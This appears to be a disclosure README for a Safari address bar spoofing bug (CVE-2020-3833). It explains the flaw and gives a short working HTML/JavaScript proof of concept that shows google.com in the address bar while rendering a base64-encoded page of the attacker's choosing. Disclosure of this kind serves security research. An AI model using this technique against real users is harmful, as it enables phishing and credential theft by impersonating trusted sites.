# Safari Address Bar Spoof (CVE-2020-3833)

In browsers, an address bar represents the current web address.

## Address bar spoof vulnerability 

It is an ability to keep legit URL in the address bar while loading the content from other domain. This makes the user believe that the content is served by a legit domain. For example, the browser is displaying https://www.google.com in the address bar or Omni-box while rendering the content from https://www.evil.com

The basics idea to find such vulnerabilities is to first initiate the javascript call and then interrupt it. 

## Proof of concept code
```
<html>
    <head>
        <title>Address Bar Spoof!</title>
    </head>
    <body>
        <script>
            function demo() {
            var evilPage = 'PGh0bWw+Cjx0aXRsZT4KZ29vZ2xlLmNvbQo8L3RpdGxlPgo8Ym9keT4KPGgzPkFkZHJlc3MgQmFyIFNwb29mIC1AQzBkM0czM2s8L2gzPgo8L2JvZHk+CjwvaHRtbD4=';
                var x = window.open('','');
                setInterval(function(){x.location.replace('https://www.google.com:8080');});
                x.document.write(atob(evilPage));
            }
        </script>
        <button onclick="demo();">test</button>
    </body>
</html>
```

Here first we invoked a window.open() method and then we changed the location of that window to invalid port URL and right after we write into the DOM using document.write() method. Since we provided an invalid port URL browser will keep displaying it while displaying the content from attackers domain. we can achieve 30+ seconds spoof using this vulnerability 

## Video demonsttation

![poc](https://github.com/c0d3G33k/Safari-Adress-Bar-Spoof-CVE-2020-3833-/blob/master/Safari-address-bar-spoof.gif)
